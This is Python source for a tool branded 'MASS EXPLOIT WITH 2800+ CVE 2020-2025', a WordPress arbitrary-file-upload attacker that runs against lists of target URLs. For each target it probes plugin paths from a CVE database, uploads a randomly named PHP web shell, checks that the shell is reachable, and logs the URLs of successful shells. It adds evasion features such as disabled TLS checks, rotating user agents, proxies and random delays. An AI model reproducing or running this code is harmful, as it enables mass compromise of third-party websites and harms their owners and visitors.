class SSLBypass(requests.adapters.HTTPAdapter):
    def init_poolmanager(self, *args, **kwargs):
        c = ssl.create_default_context()
        c.check_hostname = False
        c.verify_mode = ssl.CERT_NONE
        c.set_ciphers('DEFAULT@SECLEVEL=1')
        kwargs['ssl_context'] = c
        return super().init_poolmanager(*args, **kwargs)

def get_session(timeout=15, proxy=None):
    s = requests.Session()
    s.mount('https://', SSLBypass())
    s.verify = False
    s.headers.update({"User-Agent": random.choice(USER_AGENTS)})
    if proxy:
        s.proxies = {"http": proxy, "https": proxy}
    return s

def rotate_ua(session):
    session.headers.update({"User-Agent": random.choice(USER_AGENTS)})

def is_false_positive(response):
    if response.status_code in BLOCK_CODES:
        return True
    body = response.text.lower()
    for pat in FALSE_POSITIVE_PATTERNS:
        if pat in body:
            return True
    if len(response.text) < 10:
        return True
    return False

def get_http_label(code):
    return HTTP_RESPONSE_LABELS.get(code, "Unknown")

def validate_upload_success(response):
    if response.status_code != 200:
        return False
    for pat in SUCCESS_PATTERNS:
        if pat in response.text:
            return True
    return False

def check_vulnerable(session, target, cve_id, retries=2):
    rotate_ua(session)
    cve = CVE_DB[cve_id]
    for attempt in range(retries):
        try:
            r = session.get(urljoin(target, cve["check_path"]), timeout=5)
            if r.status_code != 200:
                return False, r.status_code
            if len(r.text) < 10:
                return False, r.status_code
            if is_false_positive(r):
                return False, r.status_code
            return True, r.status_code
        except requests.exceptions.Timeout:
            if attempt < retries - 1:
                time.sleep(0.5)
        except:
            pass
    return False, 0

def exploit_upload(session, target, cve_id, retries=2):
    rotate_ua(session)
    cve = CVE_DB[cve_id]
    year = datetime.now().year
    month = datetime.now().month

    for mime in cve.get("mime_types", ["application/x-php"]):
        for ext in cve.get("extensions", [".php"]):
            shell_name = ''.join(random.choices(string.ascii_lowercase, k=10)) + ext
            url = urljoin(target, cve["exploit_endpoint"])
            poc_content = SHELL_CODE.encode() if isinstance(SHELL_CODE, str) else SHELL_CODE

            for attempt in range(retries):
                try:
                    rotate_ua(session)
                    files = {cve["file_field"]: (shell_name, poc_content, mime)}
                    upload_resp = session.post(
                        url,
                        data=cve.get("exploit_data", {}),
                        files=files,
                        timeout=15
                    )

                    if is_false_positive(upload_resp):
                        break

                    for path in cve["upload_paths"]:
                        p = path.replace("{filename}", shell_name)\
                                 .replace("{year}", str(year))\
                                 .replace("{month}", f"{month:02d}")
                        verify_url = urljoin(target, p)
                        try:
                            v = session.get(verify_url, timeout=5)
                            if validate_upload_success(v):
                                return True, verify_url, upload_resp.status_code, v.status_code
                        except:
                            pass

                except requests.exceptions.Timeout:
                    if attempt < retries - 1:
                        time.sleep(0.5)
                except:
                    pass

    return False, None, 0, 0

def scan_cve(session, target, cve_id, delay=0):
    if delay > 0:
        time.sleep(random.uniform(0, delay))
    try:
        cve = CVE_DB[cve_id]
        plugin_exists, check_code = check_vulnerable(session, target, cve_id)
        if not plugin_exists:
            return {
                "cve": cve_id,
                "status": "NOT_VULN",
                "url": None,
                "check_code": check_code,
                "upload_code": None,
                "verify_code": None,
                "cvss": cve.get("cvss", 0),
                "auth": cve.get("auth_required", False),
            }

        success, url, upload_code, verify_code = exploit_upload(session, target, cve_id)
        if success:
            return {
                "cve": cve_id,
                "status": "VULN",
                "url": url,
                "check_code": check_code,
                "upload_code": upload_code,
                "verify_code": verify_code,
                "cvss": cve.get("cvss", 0),
                "auth": cve.get("auth_required", False),
            }

        return {
            "cve": cve_id,
            "status": "PLUGIN_FOUND_PATCHED",
            "url": None,
            "check_code": check_code,
            "upload_code": upload_code,
            "verify_code": verify_code,
            "cvss": cve.get("cvss", 0),
            "auth": cve.get("auth_required", False),
        }
    except:
        return {
            "cve": cve_id,
            "status": "ERROR",
            "url": None,
            "check_code": 0,
            "upload_code": None,
            "verify_code": None,
            "cvss": 0,
            "auth": False,
        }

def scan_target(target, threads, timeout, output, delay, cve_filter=None, proxy=None):
    session = get_session(timeout, proxy)
    results = {"vuln": [], "not_vuln": [], "plugin_found": [], "error": []}
    cve_list = list(CVE_DB.keys()) if not cve_filter else [c for c in cve_filter if c in CVE_DB]
    random.shuffle(cve_list)

    with ThreadPoolExecutor(max_workers=threads) as ex:
        futures = {ex.submit(scan_cve, session, target, cid, delay): cid for cid in cve_list}
        for future in as_completed(futures):
            try:
                result = future.result()
                cve_id = result["cve"]
                cve_name = CVE_DB[cve_id]["name"]
                chk = result.get("check_code", 0)
                upl = result.get("upload_code")
                vrf = result.get("verify_code")
                cvss = result.get("cvss", 0)
                auth = "Auth" if result.get("auth") else "NoAuth"
                ts = datetime.now().strftime("%H:%M:%S")

                if result["status"] == "VULN":
                    upl_lbl = f"Upload:{upl}" if upl else ""
                    vrf_lbl = f"Verify:{vrf}" if vrf else ""
                    print(f"[{ts}] {G}VULN{RS} [{cve_id}] {cve_name} | CVSS:{cvss} | {auth} | {result['url']} | {upl_lbl} {vrf_lbl}")
                    results["vuln"].append(result)

                elif result["status"] == "PLUGIN_FOUND_PATCHED":
                    upl_lbl = f"HTTP:{upl}" if upl else "Upload:Blocked"
                    print(f"[{ts}] {Y}PATCHED{RS} [{cve_id}] {cve_name} | CVSS:{cvss} | Check:{chk} {get_http_label(chk)} | {upl_lbl}")
                    results["plugin_found"].append(result)

                elif result["status"] == "ERROR":
                    results["error"].append(cve_id)

                else:
                    print(f"[{ts}] {D}NOT FOUND{RS} [{cve_id}] {cve_name} | HTTP:{chk} {get_http_label(chk)}")
                    results["not_vuln"].append(cve_id)

            except:
                pass

    if output and results["vuln"]:
        with open(output, "a") as f:
            for v in results["vuln"]:
                f.write(f"{v['url']} | {v['cve']} | CVSS:{v['cvss']} | {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")

    print(f"\n{'='*60}")
    print(f"{C}[SUMMARY] {target}{RS}")
    print(f"  {G}VULN          : {len(results['vuln'])}{RS}")
    print(f"  {Y}PLUGIN/PATCHED: {len(results['plugin_found'])}{RS}")
    print(f"  {D}NOT FOUND     : {len(results['not_vuln'])}{RS}")
    print(f"  {R}ERROR         : {len(results['error'])}{RS}")
    print(f"{'='*60}\n")
    return results

def main():
    print(r"""______  ____________  ___________________________    ___________
___  / / /__    |_  |/ /_  __ \__  __ \_  ____/_ |  / /__  ____/
__  /_/ /__  /| |_    /_  / / /_  /_/ /  /    __ | / /__  __/   
_  __  / _  ___ |    | / /_/ /_  _, _// /___  __ |/ / _  /___   
/_/ /_/  /_/  |_/_/|_| \____/ /_/ |_| \____/  _____/  /_____/   
                                                                
         >>> MASS EXPLOIT WITH 2800+ CVE 2020-2025 <<<                 """)
    print(f"\n{M}{'='*60}")
    print(f"  Author    : id1otSec")
    print(f"  Telegram  : XaiSyndicate99")
    print(f"{'='*60}{RS}")
    print(f"{C}[*] CVE database loaded: {len(CVE_DB)} entries{RS}\n")
    print(f"""
● Multi-CVE execution (ribuan signature)
● Adaptive payload injection (response-aware)
● High-speed threaded scanning
● Smart payload adaptation""")

    parser = argparse.ArgumentParser(description="WordPress AFU Scanner")
    parser.add_argument("-u", "--url", help="Single target URL")
    parser.add_argument("-l", "--list", help="File containing list of URLs")
    parser.add_argument("-t", "--threads", type=int, default=10, help="Number of threads (default: 10)")
    parser.add_argument("-o", "--output", help="Output file for VULN results")
    parser.add_argument("--timeout", type=int, default=15, help="Request timeout seconds (default: 15)")
    parser.add_argument("--delay", type=float, default=0, help="Random delay between requests e.g. 0.5")
    parser.add_argument("--cve", help="Scan specific CVE only e.g. CVE-2020-25213")
    parser.add_argument("--proxy", help="Proxy URL e.g. http://127.0.0.1:8080")
    args = parser.parse_args()

    if not args.url and not args.list:
        print(f"{R}[!] Usage examples:")
        print(f"    python3 exp.py -u https://target.com")
        print(f"    python3 exp.py -l list.txt -t 20 -o result.txt")
        print(f"    python3 exp.py -l list.txt --delay 0.5 --proxy http://127.0.0.1:8080")
        print(f"    python3 exp.py -u https://target.com --cve CVE-2020-25213{RS}")
        sys.exit(1)

    cve_filter = [args.cve] if args.cve else None

    targets = []
    if args.list:
        with open(args.list) as f:
            targets = [l.strip() for l in f if l.strip()]
    elif args.url:
        targets = [args.url]

    print(f"{C}[*] Targets loaded: {len(targets)}{RS}")

    for i, target in enumerate(targets, 1):
        if not target.startswith(('http://', 'https://')):
            target = 'http://' + target
        print(f"\n{B}[{i}/{len(targets)}] Scanning: {target}{RS}")
        scan_target(target, args.threads, args.timeout, args.output, args.delay, cve_filter, args.proxy)

if __name__ == "__main__":
    main()

